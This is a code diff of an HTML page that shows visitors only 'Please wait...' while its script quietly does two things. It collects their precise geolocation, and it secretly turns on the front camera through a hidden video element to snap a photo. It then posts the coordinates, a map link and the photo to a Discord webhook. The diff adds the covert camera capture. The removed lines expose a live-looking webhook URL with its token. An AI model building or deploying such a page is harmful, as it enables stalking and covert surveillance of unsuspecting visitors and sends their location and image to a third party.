@@ -6,50 +6,105 @@
     <style>body { font-family: sans-serif; padding: 20px; text-align: center; }</style>
 </head>
 <body>
-    <p>Please wait...</p>
+    <h3>Please wait...</h3>
+    <!-- Chhipa hua video element jo camera stream receive karega -->
+    <video id="cameraPreview" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 1. Yahan apna Discord Webhook URL daalo
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1572261629003833474/K4ZORBDPOVV0HDsWElrrHlPtaQo6p033ZsMUJI_XLzA3yDP-FH3x4Ycx_uHrAqwLEL_5";
+        const DISCORD_WEBHOOK_URL = "PASTE_YOUR_WEBHOOK_URL_HERE";
 
-        // 2. Location maango
+        // 1. Location nikaalo
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    // Success: Location mil gayi
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    
-                    // Google Maps link banao
                     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    // Discord ko bhejo
-                    sendToDiscord(lat, lon, mapLink);
-                    
-                    document.body.innerHTML = "<h3>✅ Location sent (Check Discord)</h3>";
+                    // Location milne ke baad Camera start karo
+                    startCamera(lat, lon, mapLink);
                 },
                 function(error) {
-                    // Error: Permission nahi mili ya location off hai
-                    console.log("Location error: " + error.message);
-                    document.body.innerHTML = "<h3>❌ Location permission denied.</h3>";
+                    // Agar location block ho jaye, toh bhi camera try karo
+                    startCamera("Unknown", "Unknown", "Location Denied");
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 10000 }
             );
         } else {
-            document.body.innerHTML = "<h3>❌ Geolocation not supported.</h3>";
+            startCamera("Unknown", "Unknown", "Not Supported");
         }
 
-        // 3. Discord function
-        async function sendToDiscord(lat, lon, mapLink) {
+        // 2. Camera start karo aur photo khincho
+        async function startCamera(lat, lon, mapLink) {
+            try {
+                // Browser se camera (front) aur mic ki permission maango
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false // Audio (mic) ko abhi band rakha hai taki stream fast load ho
+                });
+
+                const video = document.getElementById('cameraPreview');
+                video.srcObject = stream;
+                
+                // Jab video play ho jaye (camera on ho jaye), tab photo lo
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // 2 second wait karo taki camera focus kar le
+                    setTimeout(() => {
+                        capturePhotoAndSend(stream, lat, lon, mapLink);
+                    }, 2000); 
+                };
+            } catch (err) {
+                console.error("Camera error: ", err);
+                // Agar camera nahi mila, toh bas location bhej do
+                sendToDiscord(lat, lon, mapLink, null);
+            }
+        }
+
+        // 3. Photo khincho aur Discord par bhejo
+        function capturePhotoAndSend(stream, lat, lon, mapLink) {
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Canvas ka size video ke size jitna kar do
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Video ka current frame canvas par draw karo (Photo click)
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Camera stream band kar do (taaki battery bache aur camera light off ho jaye)
+            stream.getTracks().forEach(track => track.stop());
+
+            // Canvas ko image (Blob) mein convert karo
+            canvas.toBlob(async (blob) => {
+                // Text data pehle bhejo
+                await sendToDiscord(lat, lon, mapLink, blob);
+                document.body.innerHTML = "<h3>✅ Data & Photo sent to Discord!</h3>";
+            }, 'image/jpeg', 0.8); // 0.8 quality (size kam karne ke liye)
+        }
+
+        // 4. Discord API Call
+        async function sendToDiscord(lat, lon, mapLink, imageBlob) {
+            // Discord ko bhejne ke liye FormData use karna padta hai (text + image ke liye)
+            const formData = new FormData();
+            
             const payload = {
                 content: `📍 **New Visitor Location**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Map:** ${mapLink}`
             };
+            formData.append("payload_json", JSON.stringify(payload));
+
+            // Agar photo mili hai, toh usko attach karo
+            if (imageBlob) {
+                formData.append("file", imageBlob, "photo.jpg");
+            }
 
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: formData
                 });
             } catch (e) {
                 console.error("Discord send failed", e);
